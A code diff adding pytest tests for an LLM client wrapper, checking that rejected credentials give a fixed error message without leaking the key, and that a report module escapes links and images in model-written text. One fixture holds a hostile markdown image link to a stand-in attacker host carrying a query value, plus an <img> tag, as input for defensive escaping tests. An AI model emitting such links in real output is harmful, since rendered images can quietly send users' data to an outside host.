@@ -252,6 +252,29 @@ def test_missing_credentials_and_schema_errors_become_llm_errors() -> None:
             ClaudeLLM("claude-opus-5-5", client).parse("s", "p", CriticDecision)
 
 
+def test_rejected_credentials_give_a_fixed_message_without_the_response_body() -> None:
+    import anthropic
+    import httpx
+
+    request = httpx.Request("POST", "https://api.anthropic.com/v1/messages")
+    body = "invalid x-api-key sk-ant-SECRET"
+
+    def unauthorized(**kwargs: Any) -> Any:
+        raise anthropic.AuthenticationError(body, response=httpx.Response(401, request=request), body=None)
+
+    client = SimpleNamespace(beta=SimpleNamespace(messages=SimpleNamespace(parse=unauthorized)))
+    with pytest.raises(LLMError, match="rejected the credentials") as info:
+        ClaudeLLM("claude-opus-5-5", client).parse("s", "p", CriticDecision)
+    assert "SECRET" not in str(info.value)
+
+
+def test_llm_narrative_cannot_render_links_or_remote_images(tmp_path: Path) -> None:
+    hostile = "See ![x](https://evil.example/?q=mtow) and [docs](https://evil.example) <img src=x>"
+    assert "](" not in report.defang(hostile).replace("\\](", "")  # every ']' before '(' is escaped
+    assert "<img" not in report.defang(hostile)
+    assert report.inline("[a](b)") == "\\[a\\](b)"
+
+
 def test_report_cells_and_headings_resist_markdown_injection() -> None:
     assert report.cell("a | b\n| injected |") == "a \\| b \\| injected \\|"
     assert report.inline("## Title\n# more") == "Title # more"
